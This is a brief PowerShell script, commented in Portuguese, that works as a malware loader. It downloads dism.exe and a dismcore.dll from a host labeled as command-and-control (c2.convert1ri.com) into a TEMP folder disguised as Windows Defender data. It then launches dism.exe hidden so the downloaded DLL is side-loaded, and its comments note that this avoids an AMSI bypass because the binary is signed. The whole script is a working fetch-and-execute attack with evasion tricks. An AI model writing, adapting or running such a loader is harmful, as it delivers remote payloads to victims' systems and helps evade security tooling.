# exec-dism.ps1 — Baixa dism.exe + dismcore.dll e executa via side-loading
# Sem AMSI bypass (não precisa — binário é signed)

$ErrorActionPreference='SilentlyContinue'
$d=$env:TEMP+'\Microsoft\WinDefData'
if(!(Test-Path $d)){New-Item $d -Force|Out-Null}

Write-Host "[1/3] Baixando dismcore.dll..."
try{
    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
    (New-Object Net.WebClient).DownloadFile('https://c2.convert1ri.com/download/dismcore.dll',$d+'\dismcore.dll')
    Write-Host "OK"
}catch{Write-Host "ERRO: $_"}

Write-Host "[2/3] Baixando dism.exe..."
try{
    (New-Object Net.WebClient).DownloadFile('https://c2.convert1ri.com/download/dism.exe',$d+'\dism.exe')
    Write-Host "OK"
}catch{Write-Host "ERRO: $_"}

Write-Host "[3/3] Executando..."
Start-Process $d+'\dism.exe' -WindowStyle Hidden
Write-Host "Executado"
